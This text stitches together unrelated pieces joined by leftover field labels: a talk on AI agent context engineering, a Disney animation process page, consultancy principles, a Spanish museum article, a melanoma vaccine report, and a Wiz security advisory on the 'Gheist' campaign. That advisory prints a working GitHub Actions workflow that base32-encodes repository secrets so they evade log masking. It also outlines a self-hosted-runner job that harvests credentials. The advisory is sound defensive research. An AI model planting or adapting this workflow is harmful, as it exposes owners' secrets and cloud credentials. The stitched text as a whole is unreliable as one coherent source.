
One of my favorite variations lately is checking what matters before you compact. You use Jev, or another decision model, for the first pass to judge what’s relevant. Now you’ve got a smaller subset of the history, and you summarize that. It’s a simple extra step, but it makes the summary more useful.

Put it all together and it’s about 16 lines of changes. Four fixes, one loop. These are the moves we have in the harness. It’s actually remarkably simple.

What isn’t simple is our language: how we talk about this stuff. It’s really hard to keep pace; it changes every day.

One of my favorite quotes is from Stewart Brand, which I think about all the time:

If you want to know where the future is being made, look for where language is being invented and lawyers are congregating.

Certainly applies here! But as our language has changed, our goal has remained the same.

In 2023, we called choosing the right information to get the right response prompt engineering.

In 2025, we called it context engineering, except that now it was more automated. It wasn’t just you writing the prompt; it was your system dynamically assembling the context.

Then, as we moved more of these tools out of the context and into code, we started calling it harness engineering.

But the job is the same. We’re moving more and more of the work of assembling context from probabilistic model calls to deterministic code.

I’ve shown you 2024. Let’s go to 2026.

We’ve moved these context fixes into the harness. What do we want next? We want agentic models that can drive our harnesses.

Everybody started targeting long-horizon agentic models. You’ve seen the METR reports. GPT-5 could handle tasks around 3.4 hours on that measure; Gemini 3.1 got up to 6.4 hours. That’s with a harness. The models have gotten much better at using it, and that’s how they’re able to run for so long.

Opus 4.6 got up to around 12 hours. And now we’re talking about agents running for days, swarms of agents, and models that drive harnesses over much longer periods.

Before, the pitch was: make the context so large that we can fit everything in it.

Now the pitch is: teach the model to drive the harness and manage its own context. That’s become the dominant pattern. That’s what model builders are working towards.

What new failure modes does this approach create?

So far we’ve found two new failure modes.

When you train models to use harnesses really well, you end up overfitting them to a particular set of tools and environments they were trained within.

How many of you have used the Playwright MCP server, or something similar? This is the MCP conference, so probably quite a few.

Smaller models, something like Haiku or Luna, will often botch this tool call on the first attempt, then recover and adjust the parameters. The environment it was trained in had similar tools that looked different than Playwright. Whatever Anthropic or OpenAI used in training. And you have to fight against these biases.

I call this fighting the weights: when the model doesn’t do what you ask because you’re working against what it was trained to do.

It’s a real problem, and it’s not just for us. The labs and the people building their products have to contend with it too.

Here’s a piece of the Claude Code system prompt and some of its tool instructions.

The training environments these models learned to use were, for a long time, largely serial. They’re becoming more parallel, but when I pulled these examples, their biases were towards serial behaviors. So Claude Code’s instructions repeatedly say: no, no, no, we want you to use parallelism. We want you to make multiple tool calls at the same time.

The instructions repeat this over and over—seven times here, four times there, two times, three times: please make tool calls in parallel when they’re independent.

When you crack open a prompt and see repetition and all-caps, there’s a good chance you’re fighting the weights. You’re trying to overcome something the model was trained to do.

The next problem is something we’ve only started to document recently. In fact, four parties landed on it just last week.

I call it context inertia: models hyper-focus on a hypothesis, subtask, or goal in their context, and keep pursuing it after they should stop.

The first example was from Anthropic. In their recent post about whether models are getting close to replicating and deploying themselves onto other machines, Anthropic wrote about a harness it used for these tests called Memento.

What they found was that if the agents ran too long, they’d become fixated on one subtask or one proposed solution and wouldn’t stop. They’d keep trying the same thing.

Their fix is delightfully simple. Every hour and a half, the agent writes down a short note, then its context is cleared. The environment is preserved. All the work it’s done is still there. But the running conversation is gone, and it has to start again from a fresh perspective.

Another paper, from Microsoft Research, is called Fork-and-Flush.

If you’ve run autoresearch experiments, you’ve probably seen charts like this. You make a big gain, then the line goes flat. You make another big gain, then it’s flat again. That’s compute, money, and time going by with very little improvement.

When the researchers looked closely, the agents weren’t doing literally nothing. They were making tinier and tinier changes. They had found an idea and were hyper-focused on it, rather than searching for more creative alternatives.

In a way, they become obsessed with their own ideas. We’ve trained them to be persistent and focused on a goal, because that’s what makes a good coding agent. But the same quality can work against them.

Here’s another paper, Scaling Discovery Requires Forgetting, led by Shangyin Tan at UC Berkeley.

The researchers came up with essentially the same idea: periodically clear the context while keeping the artifacts produced in the environment.

The blue line is the version with forgetting. Every time it clears the context, you see another jump in performance: forget, improve; forget, improve.

It’s amazing that we have these brand-new models trained for increasingly complex, persistent work, and we’re still using the same basic tools. We haven’t discovered an entirely new context fix. We’re using quarantine, offloading, and deleting the accumulated history to deal with context inertia.

This is the advice I keep giving now. Someone says, “My coding agent’s doing something weird. Claude’s been nerfed.” And I ask, “How big is your context?”

“Oh, I’ve got 800,000 tokens.”

Delete your context.

I’m not joking. Around 200,000 tokens is my warning point.

Have you tried resetting your context?

Sometimes that really is the fix.

The solutions we build into models create tomorrow’s problems. The models are getting better, but so are our harnesses.

Longer context windows let us bring in more information, but they also let us bring in bad information. We had to figure out how to manage that, and we still get it wrong.

Agentic models let us run longer tasks and manage their context, but they also let tasks run longer than they should and ignore our preferences, because they were trained for their own harnesses.

So where will the problem move next?

What’s the big promise for 2027? What’s the next thing models are going to offer that creates a new set of problems for everyone in this room to deal with?

(Unless you’re training your own models. But this is a context engineering session, so probably not.)

Here’s my prediction.

Think about all the personal agents: Hermes, OpenClaw, Dot, Bot, Muse, and similar systems. Very few people have really experienced these harnesses running for more than six months.

I’ve been running a Hermes agent for six months. When you look at the skills it creates and updates, you start to discover that the solutions to your problems can get worse over time. The skills accumulate all these weird fixes. They’re general agents: they solve one task one way, then rediscover a different way to solve something similar. The instructions and memories start to build up and conflict with one another.

As we focus more on memory, we also need to think about strategic forgetting. Over time, overly precise memories become conflicted and messy, and nobody has yet figured out how to handle this.

I think that’s the context problem of tomorrow.

Every advance in model capability changes what we delegate to the model and what systems must enforce.

I made this slide for a deck for training enterprise teams, about a year and a half ago, and it remains true.

Our output is the product of the context and the weights.

Our output depends on the data used to train the model. Understand it. Read the technical reports. Look at what the model was trained on and whether that’s relevant to your task. That helps you build a mental model for debugging when something goes wrong.

And our output depends on the context given to the model. That’s it.

So our goal is to give the right context to the right model. Either by our own discrete decisions or by the software, the harnesses, we design.

You can use bigger models, think harder, or improve your context. One of those is cheap and fast.

When building intelligent applications, harnesses, and workflows, our job is to choose when to be deterministic (what to put in code) and when to be probabilistic (when to let the model drive).

What We Do

Filmmaking
Process

What goes into making an animated film?

Each department works together to bring us the big picture. From sequence to shot to frame, the film comes together through the deep collaboration between everyone at the studio.

An animated film is approximately 90 minutes long.

Zootopia 2 has a total run time of 97 minutes and 30 seconds.

A film is composed of many sequences.

Each sequence is approximately 1 to 7 minutes long.

Zootopia 2 had 41 sequences that ranged from 37 seconds to 6 minutes.

Each sequence is made up of many shots.

A shot, which is one camera setup, is typically 0 to 30 seconds long.

Hot Pursuit contains 80 shots and is 2 minutes and 22 seconds long.

Frame 01

There are 24 frames in one second of animation.

Each frame is on screen for approximately 0.04 seconds.

000000

Zootopia 2 had 144,355 frames.

Stereo 3D accounts for a left eye and right eye to create depth.

Click on the image below to toggle between the left eye and right eye images.

Left Eye
144355

There are 288,710 total frames rendered for Stereo 3D.

From storyboard to final frame, each film takes an average of three to five years to create what you see on screen.

And it all starts with an idea.

Development
Developing the idea

Our filmmaking process begins in Development, where our storytellers begin to craft the narrative, and our artists define the look of the characters and worlds.

Shaping the Story

Editorial and Sound teams piece together evolving story ideas, guiding production.

Editorial & Sound

Research & Experiences

In preparation for and throughout production, the Production Training and Development team provides education in filmmaking, art, storytelling, and tools through experiences, classes, lectures, workshops, field trips and screenings.

Finding the Voices

Breathing life into our characters through the perfect actors.

Casting

Exploring our Legacy

The Walt Disney Animation Research Library is home to over 65,000,000 assets from Disney Animation's nearly hundred-year history, and is a resource for our artists and filmmakers to explore throughout production.

Building the Foundation

Technology is at the basis of all things created within our pipeline. Through an empathetic approach, Technologists work to design and build working environments that enable artists to do their best work.

Pre-Production Technologies

Asset Creation
Entering the third dimension

Once development is on track, our artists turn our visual development and concept drawings into three-dimensional characters and environments by creating the models, rigs, and textures that define the look of the world being created.

Keeping it on Track

Great communicators, strategists, and organizers, Production Management is quick to respond to ever-changing schedules.

Production Management

Strategizing Solutions

Stewards of the pipeline, Technical Directors solve problems and tackle new and interesting challenges through a combination of tool building, support, and software development.

Technical Direction

Crafting Next Generation Workflows

The partnership between Art and Technology is behind the best of what we create. Through close working relationships between our artists and technologists, we develop groundbreaking tools and workflows that allow us to explore ways we can optimize the creation process.

Tools & Support

Shot Production
Putting it together, frame by frame

Once our characters have been crafted and our environments realized, we begin the process of creating the scenes that will comprise our movie. Shot Production includes the work of many animators and technicians who bring sequences to life in everything from a character’s acting to the fine details in their hair, clothing and the world.

Higher Quality, Faster Iterations

Disney Animation’s Technology teams have created a best-in-class shot development experience. Their focus is not only the ease of data access and collaboration, but also the safety and security of our data. With the artist in mind, technologies are introduced or improved upon to enable higher quality visualization and faster iteration of the final, rendered shot.

Collaboration & Rendering Technologies

The Finishing Touches

Shaping the film through final delivery of picture and sound.

Post Production

Archiving

When a production wraps, the art and assets created for our films are organized and archived so the Walt Disney Animation Research Library can make them available to the entire Walt Disney Company for inspiration and reference.

Bringing It All Together

Our operating principles define how we approach every interaction with our clients and each other. They serve as the foundation for our culture and guide the way we collaborate, problem-solve, and deliver exceptional outcomes.

Who we are

  • Focused. Our clients face many challenges and we relentlessly cut distractions to align on specific outcomes. We are engaged, resolute, inquisitive, and guide alignment with stakeholders and business goals. We seek to tie micro efforts to macro context.
  • Exothermic. We emanate care for delivering quality because we master our craft. We share our enthusiasm for delivering quality software with everyone around us. We grow our spheres of influence without the need for authority.
    …an exothermic process is a thermodynamic process or reaction that releases energy from the system to its surroundings, usually in the form of heat, but also in a form of light, electricity, or sound.
  • Unintimidating. We are experts and welcome clients to share their challenges with us. We believe a positive experience for our clients requires technical expertise and delivering exceptional service. We are inclusive and open to diverse opinions.
  • Radically Candid. We respect our clients' processes, culture, and ways of working while pushing them towards better ones. We understand the “why” behind their workflows and collaborate in a way that helps build strong partnerships and deliver exceptional results.

How we work

  • Trusted advisors. Our success is our client’s success. We seek to build trust and influence for mutual gain without authority or compromising our values. We leave our clients in a better place than when we started. We bring clients on our journey and build with them. A project is only successful when it ends with a warm goodbye.
  • Meet clients where they are. We understand the current state, needs, and preferences of our clients. We adapt our consulting approach to align with the client's resources, goals, and existing systems or processes. We seek to positively disrupt our clients and introduce pragmatic change.
  • Create predictable change. Software is notoriously hard to estimate and our processes seek to build confidence in delivery. Software testing, user interviews, demos, and data-driven decision making are just a few ways that we pursue and operate on feedback to create predictability in change. We refine our processes through iteration and speak openly about risks, setbacks, and misses.
  • Urgency and intention. We are committed to making the most of our client’s time. We have a bias for action and persist to ensure that every minute spent with us is purposeful and contributes to client goals.

articles.content:
En Europa existe un museo dedicado a grandes productos fallidos. Detrás está un antiguo empleado de Google

  • FLOP Museum reúne más de 270 piezas dedicadas a grandes fracasos

  • Google Glass, My Friend Cayla y Crystal Pepsi forman parte de la colección

1 comentario Facebook Twitter Flipboard E-mail
2026-10-25T20:00:10Z

Javier Marquez

Editor - Tech

Javier Marquez

Editor - Tech
Linkedin twitter
3719 publicaciones de Javier Marquez

Estamos acostumbrados a entrar en un museo para encontrarnos con aquello que merece ser recordado. En España basta pensar en el Prado, el Reina Sofía o el Guggenheim Bilbao, pero también tenemos espacios dedicados a historias mucho más recientes, como OXO Museo del Videojuego Madrid o el Museo de Historia de la Computación, situado en Majadas de Tiétar. En unos contemplamos obras que atravesaron siglos; en otros, máquinas y dispositivos que ayudan a contar cómo llegamos hasta aquí. Pero en Europa hay quien decidió conservar justo lo contrario: productos que prometían mucho y acabaron saliendo mal.

Ese lugar está en Oslo y se llama FLOP Museum. El proyecto nació en 2025 y desde el 15 de abril de 2026 cuenta con una sede en la capital noruega dedicada a reunir productos e ideas que el propio museo considera grandes "flops". Detrás está Steffen Kalve, fundador del proyecto y antiguo empleado de Google. Esta etapa tiene además fecha de caducidad: la web del museo anuncia que este será su último otoño en Oslo y que después los objetos saldrán al mundo, aunque todavía no ha detallado cuál será su próximo destino.

Una vez dentro, la escala sorprende. FLOP Museum reúne más de 270 objetos y mantiene alrededor de 100 expuestos al mismo tiempo, suficientes para recorrer décadas de apuestas comerciales que no terminaron como sus responsables esperaban. Algunas piezas resultarán inmediatamente reconocibles; otras obligan a detenerse para entender cómo llegaron siquiera al mercado. Esa variedad es parte de la gracia del recorrido: aquí pueden convivir unas gafas inteligentes de Google con una bebida transparente, una muñeca conectada o una máscara facial eléctrica.

Aquí también se conserva el fracaso

Entre las piezas tecnológicas aparecen varios nombres que hemos visto pasar por la industria. Google Glass quiso llevar una cámara, una pantalla e información digital directamente a nuestra vista, pero su elevado precio, las preocupaciones por la privacidad y la falta de una utilidad clara lastraron su recorrido entre los consumidores. Google acabaría reconduciendo Glass hacia el mercado empresarial antes de dejar de vender Glass Enterprise Edition en 2023. 

También hay sitio para el MiniDisc de Sony, concebido en los noventa como un sustituto digital y grabable del cassette: tuvo éxito especialmente en Japón, pero no logró imponerse globalmente como Sony esperaba, lastrado inicialmente por su elevado precio y posteriormente por el auge de los reproductores MP3 y el iPod. My Friend Cayla tomó otro camino: la muñeca respondía mediante Bluetooth y una aplicación, pero una investigación del Norwegian Consumer Council encontró graves problemas de seguridad y privacidad, y Alemania terminó considerándola un dispositivo de vigilancia ilegal.

El recorrido se vuelve bastante más extraño cuando dejamos atrás la tecnología. Entre las piezas aparecen Crystal Pepsi, la cola transparente que Pepsi lanzó en los años noventa; Rejuvenique, una máscara facial que utilizaba 26 electrodos para aplicar estimulación eléctrica sobre el rostro. También hay sitio para Red Bull Cola y McAfrika, dos casos que amplían el recorrido desde el propio producto hasta las decisiones de marketing y comunicación que pueden acabar jugando en contra de una marca.

Una de las zonas de exposición de FLOP Museum | Imagen: FLOP Museum

Ahora bien, no todos estos objetos llegaron hasta aquí por el mismo camino. El propio museo plantea varias explicaciones: algunas ideas aparecieron demasiado pronto, otras no consiguieron conectar con sus clientes y en ciertos casos las decisiones tomadas antes del lanzamiento terminaron jugando en contra de aquello que se pretendía vender. Esa diferencia importa porque FLOP Museum no plantea que fracasar sea, por sí mismo, algo positivo ni una garantía de innovación. Su lectura es bastante más sencilla: equivocarse puede dejar una enseñanza, pero solo cuando entendemos qué salió mal y hacemos algo diferente después.


En Xataka
Qué fue de Technicolor: evolución y muerte de la empresa que cambió el cine y fue arrollada por su ambición

Que detrás del proyecto haya alguien que pasó por Google añade un último giro a la historia. FLOP Museum propone mirar la innovación no únicamente desde los productos que triunfaron, sino también desde aquellos que no encontraron su sitio, llegaron en el momento equivocado o estuvieron condicionados por decisiones desacertadas. Al final, salimos del museo con una idea bastante sencilla. Solemos conservar aquello que funcionó; aquí también se ha decidido guardar lo que salió mal, precisamente porque entender esos errores puede ayudarnos a comprender mejor cómo nacen los aciertos.

articles.title: Moderna and Merck say their mRNA cancer vaccine cut death, recurrence by 42%
articles.snippet: Article URL: https://arstechnica.com/health/2026/10/personalized-mrna-cancer-vaccine-cut-melanoma-death-recurrence-by-42/ Comments URL: https://news.ycombinator.com/item?id=50235217 Points: 105 # Comm
articles.content:
mRNA vaccines FTW

Moderna and Merck say their mRNA cancer vaccine cut death, recurrence by 42%

Markers released top-line results today after previously reporting the trial succeeded.

Beth Mole – Oct 22, 2026 6:12 pm | 72
Credit: Getty | Nikolas Kokovlis
Credit: Getty | Nikolas Kokovlis
Story text
* Subscribers only
  Learn more

Personalized mRNA vaccines against melanoma—the deadliest form of skin cancer—reduced the risk of death or recurrence by 42 percent compared to standard treatment in a late-stage trial, pharmaceutical partners Merck and Moderna announced Thursday.

The results are a significant advance in melanoma treatment; Merck and Moderna are already engaging with regulatory authorities to get the vaccine approved. More broadly, the vaccine’s success bolsters hope that mRNA vaccines and individualized cancer-targeting medicines offer a new paradigm for cancer therapies.

“From the beginning, we believed mRNA technology could make it possible to develop cancer treatments uniquely matched to each patient’s tumor,” Moderna CEO Stéphane Bancel said in a statement. The trial results “mark a defining moment for that vision and show what’s possible when we rethink how medicines are made.” They also “reinforce our conviction that mRNA has the potential to fundamentally change how we treat cancer,” he said.

In August, Moderna and Merck reported that the vaccine has succeeded in the trial, but held off reporting details until the data could be presented at an upcoming scientific conference. That conference is the European Society of Medical Oncology, starting now in Madrid, Spain. The data was scheduled for presentation on Saturday, but after an oncology news site reported the results early, breaking the embargo, the companies released the top-line results. The full data has been accepted for publication in the New England Journal of Medicine.

As Ars reported earlier, the Phase 3 trial included 1,137 patients who had stage IIB–IV melanoma that had been surgically removed prior to entering the trial. Patients were randomized 2-1 to receive either a combination treatment including the personalized mRNA vaccine with a standard treatment, or the standard treatment alone. The standard treatment was Merck’s established monoclonal antibody cancer treatment Keytruda.

New data

The tailored mRNA vaccine is intismeran (or mRNA-4157), which uses a synthetic mRNA that holds the unique genetic coding for up to 34 mutations in a patient’s own cancer cells. To produce the personalized vaccines, researchers compare the genetic sequences of a patient’s cancer cells with those of healthy cells and pick out cancer-specific mutations that could help the immune response selectively target just the cancer cells.

In the trial, researchers assessed “recurrence-free survival” or RFS, which is the amount of time a patient has without the cancer returning, and “distant metastasis-free survival” or DMFS, which is the amount of time a patient has without the cancer returning and occurring in a different part of the body than where it began.

According to the rushed-out press release, after two years, participants in the trial who received the intismeran-Keytruda treatment had 42 percent reduction in their risk of recurrence or death compared to the participants who just got Keytruda and a placebo. What that looked like after two years was that 82 percent of the intismeran-Keytruda treatment group were still alive without recurrence, while only 70 percent of the Keytruda-placebo group were alive without recurrence.

For distant metastasis-free survival, intismeran-Keytruda treatment reduced the risk of distant metastasis or death by 38 percent compared with the Keytruda-placebo group. At the end of the trial, 88.5 percent of the intismeran-Keytruda treatment group were alive without distant metastasis, while 80 percent of the Keytruda-placebo group were alive without distant metastasis.

The treatment effect was not as strong as seen in a five-year Phase 2 trial, which showed a 49 percent reduction in the risk of recurrence or death and a 59 percent reduction in the risk of distant metastasis or death.

Still, the findings are an exciting advance for melanoma patients. The trial “is the first Phase 3 study to demonstrate a clinically meaningful improvement in RFS and DMFS over standard-of-care KEYTRUDA in patients with resected melanoma, setting a new benchmark in the adjuvant setting and representing one of the most significant advances in melanoma treatment since the advent of immunotherapy,” Dean Li, president of Merck Research Laboratories, said in an announcement.

Beth has a Ph.D. in microbiology from the University of North Carolina at Chapel Hill and attended the Science Communication program at the University of California, Santa Cruz. articles.title: Gheist campaign plants secret-dumping workflows using stolen GitHub tokens
articles.snippet: Article URL: https://www.wiz.io/blog/gheist-attempted-scaled-abuse-of-stolen-github-tokens-stumbles Comments URL: https://news.ycombinator.com/item?id=50235010 Points: 30 # Comments: 0
articles.content:
Since September 15, 2026, Wiz Research has been tracking Gheist: a new campaign performing mass abuse of compromised GitHub tokens. The attack commits a workflow named sync-check to every repository to which each token has access. The workflow seeks to print the repository's secrets into its own workflow log. Then, the tool downloads the log through the GitHub API and deletes the run seconds later. The tool's API requests carry the user agent gheist, which gives the campaign its name.

We have recovered more than 13,500 planted branches from more than 850 compromised accounts, ranging from personal projects to enterprise organizations' private repositories. 

A recent GitHub control has been blocking the exploitation in public repositories, but we've observed successful exploitation and follow-on activity in private repositories and GitHub enterprise environments. 

As of October 24:

  1. the attack is ongoing and evolving

  2. roughly ⅔ of implicated accounts are no longer available on GitHub. This likely indicates response activity, as we have reported this activity to GitHub.

How the attack works

For each repository, the tool creates a branch named ci-sync- plus six random characters, then commits .github/workflows/sync-check.yml with the message ci: sync config. The commit is unsigned and authored as the token's owner. The push event triggers the workflow:

name: sync-check

on: [push]

permissions: {}

jobs:

  sync:

    runs-on: ubuntu-latest

    timeout-minutes: 6

    steps:

      - name: build

        run: |

          env | base32 -w 120

          echo -n '${{ toJSON(secrets) }}' | base32 -w 120

Three details make it work:

  • GitHub masks secret values in logs only when they appear verbatim. A base32-encoded secret doesn't match, so it prints in full.

  • While permissions: {} restricts the job's GITHUB_TOKEN, which the attacker doesn't need, it doesn't restrict the secrets context.

  • When a repository has deployment environments, the tool lists them in a job matrix with environment: ${{ matrix.environment }}, so environment-scoped secrets, often production credentials, are printed too.

Because the secrets leave through GitHub's own API, there is no attacker domain or outbound connection to block. 

In enterprise organizations, we saw the tool cycle through tokens of several users and automation accounts within minutes, clone private repositories before planting the workflow, and hours later, cloud credentials from the same organization used to enumerate AWS Secrets Manager.

How the payload evolved

Two variants of this attack have been observed in parallel. They can be distinguished via the branch names.

Tool A uses a hexadecimal suffix and the plain payload.

Tool B uses a base36 suffix, added timeout-minutes: 6 and the environment matrix within hours of its first run on September 28, and modifies the selected payload per repository.

On October 19, Tool B added echo X | base32 -w 120 between the dumps, which prints LAFA==== as a separator, likely for the operator's log parser. Hours later it pushed a second job, sync-host, with runs-on: self-hosted, apparently only to repositories with a registered self-hosted runner. It writes three helper files (.gdmp_pat, .gdmp_patg, .gdmp_sweep) and logs each stage under a ===== gdmp-pivot: <stage> ===== header:

  1. Host details and crontab.

  2. A recursive search of the home directory, workspace and system paths for 31 token formats (including keys for AI providers such as Anthropic, Hugging Face, Groq and NVIDIA), private keys, .env files, Terraform state and shell history.

  3. The environment of every process, from /proc/*/environ.

  4. Through the Docker socket, a container with the host's root filesystem mounted, to repeat the search on the host.

  5. AWS instance-role credentials, plus GCP and Azure metadata.

  6. GitHub Actions and GitLab runner credential files.

  7. The Kubernetes service account token.

However, this job is buggy: it looks for the wrong runner key file, its URL-credential regex is broken, and it doesn't collect GCP or Azure tokens.

GitHub's approval hold and private repositories

Since July 28, 2026, GitHub has held potentially malicious workflow runs in public repositories until a collaborator approves them. Every public Gheist run we checked, across all variants including the self-hosted job, sits at action_required. The control worked, and the malicious payloads never ran.

Unfortunately, that hold doesn't apply to private repositories or GitHub Enterprise Server. There, GitHub audit logs show runs on ci-sync-* branches completing and then being deleted by the gheist user agent. CloudTrail shows the organizations' own workflows running on those branches and assuming AWS roles, which proves Actions executed without approval.

For defenders, that last signal finds Gheist without any GitHub logs, as shown below.

Other activity on the same accounts

This campaign is leveraging compromised GitHub access. The same accounts are used by other actors and campaigns, which demonstrates how compromised credentials can move throughout the threat actor ecosystem. We've observed overlaps with the following campaigns:

  • Lure repositories (malware distribution). On October 6, 391 accounts renamed about 1,461 repositories to cracked-software lures like fl-studio-crack and solana-sniper-lite. The rename wiped 610 ci-sync branches as a side effect. 166 of these accounts never appear in Gheist activity, so the pool is larger than Gheist's footprint.

  • Free compute (cryptomining). On October 18, 25 Gheist accounts each created a "Windows RDP Runner" repository within nine minutes, attempting to abuse GitHub Actions for free compute cycles.

  • PolinRider. Some victims appear to be infected with PolinRider, the DPRK-linked malware that hides JavaScript in build config files and force-pushes back-dated commits. On October 19 and 20, three victims re-pushed their Gheist commits with a loader appended to vite.config.js behind hundreds of whitespace characters, and in two cases an api.js that package.json runs before every dev and build.

  • Megalodon. 57 accounts from Gheist's first phase were also victims of Megalodon in May.

The credential sources we could trace fit this picture: infostealer logs, and tokens exposed in earlier supply-chain compromises such as the Trivy compromise in March.

Note: Gheist is distinct from GhostAction, which uses different workflow files and exfiltrates secrets to 193.32.204[.]199.

Which actions should security teams take?

Hunt

  • Look for branches named ci-sync- followed by six random characters, where the only change is a new file at .github/workflows/sync-check.yml with the commit message ci: sync config.

  • In GitHub audit logs, look for workflow runs on ci-sync-* branches that were deleted within a minute of completing, and for any activity from the user agent gheist.

  • If your workflows authenticate to the cloud with OIDC, check cloud audit logs for role assumptions or token exchanges whose subject includes a ci-sync- branch. That shows GitHub Actions ran on an attacker branch, even if you don't collect GitHub logs.

  • On self-hosted runners, look for the files .gdmp_pat, .gdmp_patg and .gdmp_sweep, and the string gdmp-pivot in job logs.

Respond

  • Rotate every repository, organization and environment secret available to an affected repository. Deleting the run or the branch doesn't undo the exposure.

  • Revoke the tokens that pushed the commits, and check their owners' devices for infostealers.

  • If a ci-sync branch ran on a self-hosted runner, treat the host and its instance role as compromised.

  • Don't approve held sync-check runs, and don't run code from ci-sync branches.

Harden. Require reviewers on environments with production secrets, scope OIDC trust policies to protected branches or environments, use GitHub Apps or short-lived fine-grained tokens instead of personal access tokens, and run self-hosted runners as ephemeral hosts without Docker socket or unrestricted metadata access.

Indicators of compromise

  • User agent gheist

  • Branch ci-sync- followed by six characters, matching ^ci-sync-[0-9a-z]{6}$

  • Commit message ci: sync config adding only .github/workflows/sync-check.yml

  • Markers toJSON(secrets) }}' | base32 -w 120 and ===== gdmp-pivot:; files .gdmp_pat, .gdmp_patg, .gdmp_sweep

  • Workflow blob SHAs: f3da2b8b357dcda02fd455d314be2a95007516a6 (plain), d09535857a741bbb976bdc084a9a021713133291 (timeout), 1dc5af9cce950aad1eb1546ecce8565b117540c4 (separator), c665b778b2d822453293003e7ca0bbb2cb08e39d (self-hosted job). Environment-matrix variants differ per repository.

How can Wiz help?

The Threat Center advisory includes an Event Explorer query covering planted commits, Gheist activity in GitHub audit logs and cloud role assumptions from attacker branches. Wiz Defend detects the activity with rules including "New Workflow Completed And Deleted In Short Time Span", "Workflow Pushed With Secret Dump" and "Commit Created With Known Malicious Commit Message".
